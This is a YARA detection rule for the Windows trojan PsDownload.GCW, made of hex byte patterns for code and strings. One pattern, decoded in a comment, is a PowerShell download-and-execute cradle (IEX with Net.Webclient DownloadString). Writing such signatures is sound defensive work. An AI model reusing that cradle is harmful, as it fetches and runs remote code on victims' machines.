
rule Trojan_Win32_PsDownload_GCW_MTB{
	meta:
		description = "Trojan:Win32/PsDownload.GCW!MTB,SIGNATURE_TYPE_PEHSTR_EXT,0c 00 0c 00 03 00 00 0a 00 "
		
	strings :
		$a_03_0 = {03 14 81 52 e8 90 01 04 59 35 90 01 04 89 45 d8 8b 45 d8 3b 45 08 75 90 01 01 8b 45 f4 8b 4d e0 0f b7 04 41 8b 4d dc 8b 55 fc 03 14 81 8b c2 90 00 } //01 00 
		$a_03_1 = {5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 4e 00 45 00 54 00 5c 00 46 00 72 00 61 00 6d 00 65 00 77 00 6f 00 72 00 6b 00 5c 00 90 02 20 5c 00 63 00 73 00 63 00 2e 00 65 00 78 00 65 00 90 00 } //01 00 
		$a_01_2 = {2f 00 63 00 20 00 22 00 70 00 6f 00 77 00 65 00 72 00 73 00 68 00 65 00 6c 00 6c 00 20 00 2d 00 63 00 6f 00 6d 00 6d 00 61 00 6e 00 64 00 20 00 49 00 45 00 58 00 28 00 4e 00 65 00 77 00 2d 00 4f 00 62 00 6a 00 65 00 63 00 74 00 20 00 4e 00 65 00 74 00 2e 00 57 00 65 00 62 00 63 00 6c 00 69 00 65 00 6e 00 74 00 29 00 2e 00 44 00 6f 00 77 00 6e 00 6c 00 6f 00 61 00 64 00 53 00 74 00 72 00 69 00 6e 00 67 00 28 00 27 00 25 00 73 00 2f 00 25 00 73 00 27 00 29 00 22 00 } //00 00  /c "powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')"
	condition:
		any of ($a_*)
 
}